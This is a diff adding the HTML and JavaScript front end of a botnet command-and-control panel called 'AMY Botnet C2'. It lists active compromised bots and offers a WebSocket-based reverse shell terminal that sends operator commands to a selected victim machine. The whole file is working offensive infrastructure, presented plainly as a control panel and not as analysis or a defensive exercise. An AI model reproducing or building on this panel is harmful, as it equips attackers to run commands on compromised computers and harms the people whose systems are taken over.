@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="uk">
+
+<head>
+    <meta charset="UTF-8">
+    <title>AMY Botnet C2</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .terminal {
+            background: #0a0a0a;
+            font-family: 'Courier New', monospace;
+            color: #00ff41;
+            height: 460px;
+            overflow-y: auto;
+            padding: 16px;
+            border: 1px solid #450a0a;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+
+<body class="bg-zinc-950 text-red-400 p-8 font-mono">
+    <h1 class="text-5xl font-bold mb-8 text-red-600">AMY BOTNET C2</h1>
+
+    <div class="grid grid-cols-2 gap-8">
+        <div>
+            <h2 class="text-2xl mb-4">Active Bots (<span id="count" class="text-red-500">0</span>)</h2>
+            <div id="botlist" class="space-y-3 mb-8"></div>
+        </div>
+
+        <div>
+            <h2 class="text-2xl mb-4">Reverse Shell Terminal</h2>
+            <div id="terminal" class="terminal"></div>
+            <div class="flex mt-3 gap-2">
+                <input id="terminal_input" class="flex-1 p-4 bg-zinc-900 border border-red-900 rounded"
+                    placeholder="whoami, ls, pwd..." onkeypress="if(event.key === 'Enter') sendTerminalCmd()">
+                <button onclick="sendTerminalCmd()" class="bg-green-600 px-8 py-4 rounded">SEND</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentBot = "";
+        let terminalWs = null;
+
+        async function updateBots() {
+            const res = await fetch('/bots');
+            const data = await res.json();
+            document.getElementById('count').textContent = data.bots.length;
+
+            let html = '';
+            data.bots.forEach(id => {
+                html += `<div onclick="selectBot('${id}')" class="bg-zinc-900 p-4 rounded border border-red-900 cursor-pointer hover:border-red-500">${id}</div>`;
+            });
+            document.getElementById('botlist').innerHTML = html || '<p class="text-zinc-500">No bots online</p>';
+        }
+
+        function selectBot(id) {
+            currentBot = id;
+            document.getElementById('terminal').innerHTML += `<span class="text-green-400">[${id}] Session started</span><br>`;
+            connectTerminal(id);
+        }
+
+        function connectTerminal(botId) {
+            if (terminalWs) terminalWs.close();
+            terminalWs = new WebSocket(`ws://${location.host}/terminal/${botId}`);
+
+            terminalWs.onmessage = function (event) {
+                const line = document.createElement('div');
+                line.textContent = event.data;
+                document.getElementById('terminal').appendChild(line);
+                document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
+            };
+        }
+
+        function sendTerminalCmd() {
+            const input = document.getElementById('terminal_input');
+            const cmd = input.value.trim();
+            if (!cmd || !currentBot) return;
+            if (terminalWs) terminalWs.send(cmd);
+            input.value = "";
+        }
+
+        setInterval(updateBots, 2000);
+        updateBots();
+    </script>
+</body>
+
+</html>
